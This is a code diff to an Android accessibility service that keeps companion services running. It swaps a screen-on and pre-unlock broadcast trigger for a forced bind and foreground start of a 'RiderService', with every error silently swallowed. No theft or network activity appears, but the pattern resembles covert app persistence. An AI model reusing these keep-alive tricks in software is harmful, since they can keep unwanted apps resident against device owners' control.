@@ -8,84 +8,58 @@ import android.os.UserManager;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.view.accessibility.AccessibilityEvent;
+import android.content.ComponentName;
+import android.content.ServiceConnection;
+import android.os.IBinder;
+
 
 public class MyAccessibilityService extends AccessibilityService {
 
-    private BroadcastReceiver screenReceiver;
+	private void BindHelper() {		            
+			
+			   try {
+                   Context appContext = getApplicationContext();
+                   Intent serviceIntent = new Intent(appContext, RiderService.class);
+
+                   appContext.bindService(serviceIntent, new ServiceConnection() {
+                       @Override
+                       public void onServiceConnected(ComponentName name, IBinder service) {                       
+                    
+                       }
+
+                       @Override
+                       public void onServiceDisconnected(ComponentName name) {                        
+                       
+                       }
+                   }, Context.BIND_AUTO_CREATE | Context.BIND_IMPORTANT | Context.BIND_ABOVE_CLIENT);
+               } catch (Throwable BindError) {}			        
+	}
 
 	@Override
 	public void onCreate() {
     super.onCreate();
 
-    new Thread(() -> {
-        try {
-            
-            registerScreenReceiver();
-
-            
-            Intent serviceIntent = new Intent(this, SimpleKeyboardService.class);
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                startForegroundService(serviceIntent);
-            } else {
-                startService(serviceIntent);
-            }
-
-            
-            Context dpsContext = createDeviceProtectedStorageContext();
-            UserManager um = (UserManager) dpsContext.getSystemService(Context.USER_SERVICE);
-
-            if (um != null && !um.isUserUnlocked()) {
-                Intent i = new Intent(dpsContext, TriggerReceiver.class);
-                dpsContext.sendBroadcast(i);
-            }
-        } catch (Throwable t) {
-            
-        }
+	try {	
+    new Thread(() -> {        			
+			BindHelper();	
+			try {
+		    Intent serviceIntent = new Intent(this, RiderService.class);
+            startForegroundService(serviceIntent);
+            } catch (Throwable fgErr) {}        	
     }).start();
-}
+	} catch (Throwable threadErr) {}	
+	
+	}
 
 
     @Override
     protected void onServiceConnected() {
-
-		super.onServiceConnected();
-        
-        
-        
+		super.onServiceConnected();                	
     }
-
-    private void registerScreenReceiver() {
-        if (screenReceiver != null) return;
-
-        screenReceiver = new BroadcastReceiver() {
-            @Override
-            public void onReceive(Context context, Intent intent) {
-                if (Intent.ACTION_SCREEN_ON.equals(intent.getAction())) {
-
-                    Intent i = new Intent(context, TriggerReceiver.class);
-                    context.sendBroadcast(i);
-                }
-            }
-        };
-
-        IntentFilter filter = new IntentFilter();
-        filter.addAction(Intent.ACTION_SCREEN_ON);
-		
-        
-		if (Build.VERSION.SDK_INT >= 34) {
-       registerReceiver(screenReceiver, filter, Context.RECEIVER_NOT_EXPORTED);
-       } else {
-        registerReceiver(screenReceiver, filter);
-         }
-    }
-
+    
     @Override
     public void onDestroy() {
-        super.onDestroy();
-        if (screenReceiver != null) {
-            unregisterReceiver(screenReceiver);
-            screenReceiver = null;
-        }
+        super.onDestroy();        
     }
 
     @Override
